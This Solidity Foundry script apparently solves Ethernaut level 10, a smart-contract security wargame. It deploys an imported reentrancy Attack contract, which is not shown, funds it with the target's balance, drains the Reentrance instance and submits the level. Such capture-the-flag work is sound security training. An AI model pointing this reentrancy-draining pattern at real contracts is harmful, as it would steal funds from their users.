// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.12;

import {Script, console2} from "forge-std/Script.sol";
import {IEthernaut} from "../interfaces/IEthernaut.sol";
import {Reentrance} from "../src/Level10.sol";
import {Attack} from "../src/Level10Attack.sol";

contract Level10 is Script {
    IEthernaut ethernaut = IEthernaut(vm.envAddress("ETHERNAUT_ADDR"));

    function run() public {
        Reentrance instance = Reentrance(payable(vm.envAddress("LVL10_ADDR")));
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Attack attack = new Attack();

        uint256 balance = address(instance).balance;
        attack.attackReentrance{value: balance}(payable(instance));

        balance = address(instance).balance;

        if (balance == 0) {
            console2.log("Level10: Success");
            ethernaut.submitLevelInstance(address(instance));
        } else {
            console2.log("call failed");
        }

        vm.stopBroadcast();
    }
}
